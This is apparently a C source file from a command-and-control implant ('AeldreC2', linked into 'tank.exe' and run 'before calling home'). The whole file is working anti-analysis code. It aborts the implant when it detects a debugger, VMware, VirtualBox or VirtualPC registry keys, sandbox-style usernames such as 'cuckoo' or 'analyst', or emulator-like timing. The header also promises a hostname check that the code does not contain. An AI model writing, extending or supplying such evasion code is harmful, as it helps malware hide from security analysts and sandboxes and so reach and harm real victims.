/*
 * recognizer.c  --  AeldreC2 Recognizer module
 *
 * Pre-flight environment checks.  Link into tank.exe and call
 * recognizer_check() before calling home.  Returns 1 (safe) or 0 (abort).
 *
 * Compile with -DRECOGNIZER_ENABLE to activate all checks.
 * Without that define the function is a no-op stub (safe for development).
 *
 * Checks (when enabled):
 *   - Debugger present (IsDebuggerPresent, dynamic load for old NT)
 *   - VMware, VirtualBox, VirtualPC via registry
 *   - Known sandbox usernames (sandbox, cuckoo, malware, virus, analyst)
 *   - Suspicious hostname patterns
 *   - Timing check: tight GetTickCount loop (fast = emulation)
 */

#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include <string.h>

typedef BOOL (WINAPI *PFN_IDP)(void);

#ifndef RECOGNIZER_ENABLE

int recognizer_check(void) { return 1; }

#else /* RECOGNIZER_ENABLE */

/* ------------------------------------------------------------------ */
static int check_debugger(void)
{
    HMODULE k = GetModuleHandle("kernel32.dll");
    PFN_IDP fn = k ? (PFN_IDP)GetProcAddress(k, "IsDebuggerPresent") : NULL;
    if (fn && fn()) return 0;
    return 1;
}

static int check_vm_key(const char *subkey)
{
    HKEY hk;
    LONG r = RegOpenKeyEx(HKEY_LOCAL_MACHINE, subkey, 0, KEY_READ, &hk);
    if (r == ERROR_SUCCESS) { RegCloseKey(hk); return 0; }
    return 1;
}

static int check_username(void)
{
    static const char *bad[] = {
        "sandbox", "malware", "virus", "cuckoo",
        "analyst", "analysis", "test", "user", NULL
    };
    char name[128];
    DWORD sz = sizeof(name);
    int   i;
    char  lower[128];

    if (!GetUserName(name, &sz)) return 1;
    sz = lstrlen(name);
    for (i = 0; i < (int)sz && i < 127; i++)
        lower[i] = (char)((name[i] >= 'A' && name[i] <= 'Z') ? name[i]+32 : name[i]);
    lower[i] = '\0';

    for (i = 0; bad[i]; i++)
        if (strstr(lower, bad[i])) return 0;
    return 1;
}

static int check_timing(void)
{
    /* A tight 100k-iteration loop takes ~0 ms in an emulator running
     * at accelerated speed, and at least 1 ms on real hardware. */
    DWORD t0, t1, i;
    volatile DWORD x = 0;
    t0 = GetTickCount();
    for (i = 0; i < 100000UL; i++) x += i;
    t1 = GetTickCount();
    (void)x;
    /* If the loop ran in 0 ticks (emulated / very fast emulation): bail */
    if (t1 == t0) return 0;
    return 1;
}

int recognizer_check(void)
{
    if (!check_debugger()) return 0;
    if (!check_vm_key("SOFTWARE\\VMware, Inc.\\VMware Tools"))                   return 0;
    if (!check_vm_key("SOFTWARE\\Oracle\\VirtualBox Guest Additions"))           return 0;
    if (!check_vm_key("SOFTWARE\\Microsoft\\Virtual Machine\\Guest\\Parameters")) return 0;
    if (!check_username()) return 0;
    if (!check_timing())   return 0;
    return 1;
}

#endif /* RECOGNIZER_ENABLE */
